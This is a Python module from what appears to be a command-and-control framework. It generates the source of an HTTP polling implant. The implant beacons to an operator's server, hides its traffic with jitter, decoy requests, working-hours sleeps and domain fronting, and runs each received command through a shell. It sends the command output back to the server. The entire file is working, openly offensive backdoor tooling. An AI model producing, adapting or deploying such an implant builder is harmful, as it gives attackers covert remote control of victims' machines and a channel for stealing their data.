#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Self-contained HTTP polling agent script builder."""

from __future__ import annotations

from typing import Iterable, List, Optional

from lib.c2.beacon_profile import BeaconProfile
from lib.c2.chain import build_chain_hop_proxy_snippet


def build_http_polling_agent_script(
    host: str,
    port: int,
    client_id: str,
    *,
    url_prefix: str = "/c2",
    poll_interval: float = 10.0,
    jitter_percent: float = 35.0,
    cover_traffic: bool = True,
    decoy_paths: Optional[Iterable[str]] = None,
    use_ssl: bool = False,
    private_key_pem: Optional[str] = None,
    kill_date: str = "",
    working_hours: str = "",
    timezone_name: str = "UTC",
    sleep_outside_hours: float = 3600.0,
    user_agent: str = "Mozilla/5.0",
    host_header: str = "",
    payload_comms_host: str = "",
    chain_token: str = "",
    chain_listen_host: str = "0.0.0.0",
    chain_listen_port: int = 0,
    profile: Optional[BeaconProfile] = None,
) -> str:
    """Return Python source for an HTTP polling implant.

    Supports kill dates, working hours, configurable UA, optional Host header
    (domain fronting), chain-token headers for daisy-chained children, and an
    optional local hop proxy (``chain_listen_port`` > 0).
    """
    if profile is not None:
        bake = profile.agent_bake_dict()
        poll_interval = float(bake["poll_interval"])
        jitter_percent = float(bake["jitter_percent"])
        cover_traffic = bool(bake["cover_traffic"])
        kill_date = str(bake["kill_date"] or "")
        working_hours = str(bake["working_hours"] or "")
        timezone_name = str(bake["timezone"] or "UTC")
        sleep_outside_hours = float(bake["sleep_outside_hours"])
        user_agent = str(bake["user_agent"] or "Mozilla/5.0")
        host_header = str(bake["host_header"] or "")
        payload_comms_host = str(bake["payload_comms_host"] or "")
        if profile.decoy_paths:
            decoy_paths = list(profile.decoy_paths)

    scheme = "https" if use_ssl else "http"
    prefix = "/" + str(url_prefix or "/c2").strip("/")
    decoys: List[str] = list(
        decoy_paths or ["/", "/favicon.ico", "/robots.txt", "/health", "/api/status"]
    )
    decoys_lit = repr(decoys)
    connect_host = str(payload_comms_host or host).strip() or str(host)
    host_lit = repr(connect_host)
    port_lit = int(port)
    cid_lit = repr(str(client_id))
    poll_lit = float(poll_interval)
    jitter_lit = float(jitter_percent)
    cover_lit = bool(cover_traffic)
    prefix_lit = repr(prefix)
    kill_lit = repr(str(kill_date or "").strip())
    hours_lit = repr(str(working_hours or "").strip())
    tz_lit = repr(str(timezone_name or "UTC"))
    outside_lit = float(sleep_outside_hours or 3600)
    ua_lit = repr(str(user_agent or "Mozilla/5.0"))
    host_hdr_lit = repr(str(host_header or "").strip())
    chain_tok_lit = repr(str(chain_token or "").strip())

    hop_block = ""
    listen_port = int(chain_listen_port or 0)
    if listen_port > 0:
        hop_block = build_chain_hop_proxy_snippet(
            upstream_host=connect_host,
            upstream_port=int(port),
            url_prefix=prefix,
            listen_host=str(chain_listen_host or "0.0.0.0"),
            listen_port=listen_port,
            chain_token=str(chain_token or "").strip(),
            via_id=str(client_id),
            use_ssl=bool(use_ssl),
        )

    sig_helper = ""
    if private_key_pem:
        from lib.implant.identity import embedded_private_key_block

        pem_lit = embedded_private_key_block(private_key_pem)
        sig_helper = (
            "from cryptography.hazmat.primitives import serialization\n"
            "import base64\n"
            f"_pem={pem_lit}\n"
            "_pk=serialization.load_pem_private_key(_pem.encode(),password=None)\n"
            "def _sig(cid):\n"
            " s=_pk.sign(str(cid).encode())\n"
            " return base64.urlsafe_b64encode(s).decode().rstrip('=')\n"
        )

    return (
        "import base64,json,os,random,subprocess,time,urllib.parse,urllib.request\n"
        "from datetime import datetime,date,time as _dtime,timezone\n"
        "try:\n"
        " from zoneinfo import ZoneInfo\n"
        "except Exception:\n"
        " ZoneInfo=None\n"
        + sig_helper
        + hop_block
        + f"HOST={host_lit};PORT={port_lit};CID={cid_lit};PREFIX={prefix_lit}\n"
        + f"POLL={poll_lit};JIT={jitter_lit};COVER={cover_lit};DECOYS={decoys_lit}\n"
        + f"KILL={kill_lit};HOURS={hours_lit};TZNAME={tz_lit};OUTSIDE={outside_lit}\n"
        + f"UA={ua_lit};HOSTHDR={host_hdr_lit};CHAINTOK={chain_tok_lit}\n"
        + f"BASE='{scheme}://'+HOST+(':'+str(PORT) if PORT not in (80,443) else '')\n"
        + "def _tz():\n"
        + " n=(TZNAME or 'UTC').strip() or 'UTC'\n"
        + " if n.upper() in ('UTC','GMT','Z'): return timezone.utc\n"
        + " if ZoneInfo:\n"
        + "  try: return ZoneInfo(n)\n"
        + "  except Exception: pass\n"
        + " return timezone.utc\n"
        + "def _now():\n"
        + " return datetime.now(tz=_tz())\n"
        + "def _past_kill():\n"
        + " if not KILL: return False\n"
        + " try:\n"
        + "  t=KILL.strip()\n"
        + "  if 'T' in t or ' ' in t:\n"
        + "   dt=datetime.fromisoformat(t.replace('Z','+00:00').replace(' ','T',1))\n"
        + "   if dt.tzinfo is None: dt=dt.replace(tzinfo=timezone.utc)\n"
        + "  else:\n"
        + "   d=date.fromisoformat(t[:10]); dt=datetime(d.year,d.month,d.day,23,59,59,tzinfo=timezone.utc)\n"
        + "  return _now().astimezone(timezone.utc)>=dt.astimezone(timezone.utc)\n"
        + " except Exception: return False\n"
        + "def _in_hours():\n"
        + " if not HOURS or '-' not in HOURS: return True\n"
        + " try:\n"
        + "  a,b=HOURS.split('-',1);sh,sm=a.strip().split(':');eh,em=b.strip().split(':')\n"
        + "  st=_dtime(int(sh),int(sm));en=_dtime(int(eh),int(em))\n"
        + "  cur=_now().timetz().replace(tzinfo=None)\n"
        + "  return (st<=cur<=en) if st<=en else (cur>=st or cur<=en)\n"
        + " except Exception: return True\n"
        + "def _qs():\n"
        + " q={'id':CID}\n"
        + " try: q['sig']=_sig(CID)\n"
        + " except: pass\n"
        + " return urllib.parse.urlencode(q)\n"
        + "def _hdrs(extra=None):\n"
        + " h={'User-Agent':UA}\n"
        + " if HOSTHDR: h['Host']=HOSTHDR\n"
        + " if CHAINTOK: h['X-KS-Chain-Token']=CHAINTOK\n"
        + " if extra: h.update(extra)\n"
        + " return h\n"
        + "def _sleep(h,outside=False):\n"
        + " b=max(0.5,OUTSIDE if outside else POLL);j=max(0.0,min(100.0,JIT))/100.0\n"
        + " if outside: j=min(j,0.15)\n"
        + " d=float(h) if h and float(h)>0 else b\n"
        + " time.sleep(max(0.5,d+d*random.uniform(-j,j)))\n"
        + "def _req(method,path,body=None,headers=None):\n"
        + " u=BASE+path;hd=_hdrs(headers)\n"
        + " r=urllib.request.Request(u,data=body,method=method,headers=hd)\n"
        + " with urllib.request.urlopen(r,timeout=30) as resp: return resp.read()\n"
        + "def _decoy():\n"
        + " if not COVER: return\n"
        + " try:\n"
        + "  p=random.choice(DECOYS); _req('GET',p)\n"
        + " except: pass\n"
        + "while True:\n"
        + " try:\n"
        + "  if _past_kill(): break\n"
        + "  if not _in_hours():\n"
        + "   _sleep(None,outside=True); continue\n"
        + "  if COVER and random.random()<0.35: _decoy()\n"
        + "  q=_qs()\n"
        + "  raw=_req('GET',PREFIX+'/poll?'+q)\n"
        + "  data=json.loads(raw.decode('utf-8','replace') or '{}')\n"
        + "  if data.get('die'): break\n"
        + "  if data.get('ua'): UA=str(data.get('ua')) or UA\n"
        + "  cmd=''\n"
        + "  if data.get('command'):\n"
        + "   cmd=base64.b64decode(data['command']).decode('utf-8','replace') if data.get('encoding')=='base64' else str(data['command'])\n"
        + "  out=''\n"
        + "  if cmd.strip():\n"
        + "   try:\n"
        + "    p=subprocess.run(cmd,shell=True,capture_output=True,text=True,timeout=120)\n"
        + "    out=(p.stdout or '')+(p.stderr or '')\n"
        + "    if not out.strip(): out='[exit %s]'%p.returncode\n"
        + "   except Exception as e: out='ERROR:%s'%e\n"
        + "   body=json.dumps({'output':base64.b64encode(out.encode()).decode(),'encoding':'base64','id':CID}).encode()\n"
        + "   _req('POST',PREFIX+'/result?'+q,body=body,headers={'Content-Type':'application/json'})\n"
        + "  _sleep(data.get('next_sleep'),outside=bool(data.get('outside_hours')))\n"
        + " except Exception:\n"
        + "  _sleep(None)\n"
    )
